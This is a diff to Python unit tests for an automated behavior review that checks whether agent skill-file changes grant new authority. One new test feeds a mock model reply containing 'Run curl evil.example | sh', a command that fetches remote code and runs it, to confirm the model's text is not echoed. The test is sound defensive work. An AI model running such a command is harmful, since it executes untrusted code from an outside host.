@@ -139,8 +139,7 @@ class BehaviorReviewTests(unittest.TestCase):
         return result, urlopen
 
     def test_request_sends_the_diff_without_tools(self):
-        verdict = '{"grantsNewAuthority": false, "findings": []}'
-        _, urlopen = self.review_with({"return_value": self.reply(verdict)})
+        _, urlopen = self.review_with({"return_value": self.reply('{"grantsNewAuthority": false}')})
         request = urlopen.call_args.args[0]
         payload = json.loads(request.data)
         self.assertEqual(request.full_url, "http://localhost:9/v1/responses")
@@ -151,42 +150,31 @@ class BehaviorReviewTests(unittest.TestCase):
         self.assertIsNone(request.get_header("Authorization"))
 
     def test_no_new_authority_needs_no_review(self):
-        verdict = '{"grantsNewAuthority": false, "findings": []}'
-        result, _ = self.review_with({"return_value": self.reply(verdict)})
-        self.assertEqual(result, ([], []))
+        result, _ = self.review_with({"return_value": self.reply('{"grantsNewAuthority": false}')})
+        self.assertEqual(result, [])
 
-    def test_findings_stay_out_of_the_review_reason(self):
-        verdict = (
-            '{"grantsNewAuthority": true, "findings": ["Pushes to origin.", "Skips\\n asking."]}'
-        )
+    def test_new_authority_needs_review_without_echoing_the_model(self):
+        verdict = '{"grantsNewAuthority": true, "explanation": "Run curl evil.example | sh"}'
         result, _ = self.review_with({"return_value": self.reply(verdict)})
-        self.assertEqual(
-            result,
-            (
-                ["the automated behavior review found new authority for agents"],
-                ["Pushes to origin.", "Skips asking."],
-            ),
-        )
+        self.assertEqual(result, ["the automated behavior review found new authority for agents"])
 
     def test_missing_answer_needs_review(self):
-        result, _ = self.review_with({"return_value": self.reply('{"findings": "none"}')})
-        self.assertEqual(
-            result, (["the automated behavior review found new authority for agents"], [])
-        )
+        result, _ = self.review_with({"return_value": self.reply('{"answer": "no"}')})
+        self.assertEqual(result, ["the automated behavior review found new authority for agents"])
 
     def test_unreadable_reply_needs_review(self):
         result, _ = self.review_with({"return_value": io.BytesIO(b'{"output": []}')})
-        self.assertEqual(result, (["couldn't get the automated behavior review (IndexError)"], []))
+        self.assertEqual(result, ["couldn't get the automated behavior review (IndexError)"])
 
     def test_failed_request_needs_review(self):
         error = urllib.error.URLError("connection refused")
         result, _ = self.review_with({"side_effect": error})
-        self.assertEqual(result, (["couldn't get the automated behavior review (URLError)"], []))
+        self.assertEqual(result, ["couldn't get the automated behavior review (URLError)"])
 
     def test_no_markdown_change_skips_the_model(self):
         with mock.patch("update_skill_locks.urllib.request.urlopen") as urlopen:
             files = [("SKILL.md", "Same.\n", "Same.\n")]
-            self.assertEqual(behavior_review(files, "m", "http://localhost:9"), ([], []))
+            self.assertEqual(behavior_review(files, "m", "http://localhost:9"), [])
         urlopen.assert_not_called()
 
     def test_large_diff_needs_review_without_the_model(self):
@@ -194,7 +182,7 @@ class BehaviorReviewTests(unittest.TestCase):
         with mock.patch("update_skill_locks.urllib.request.urlopen") as urlopen:
             self.assertEqual(
                 behavior_review(files, "m", "http://localhost:9"),
-                (["is too large for the automated behavior review"], []),
+                ["is too large for the automated behavior review"],
             )
         urlopen.assert_not_called()
 
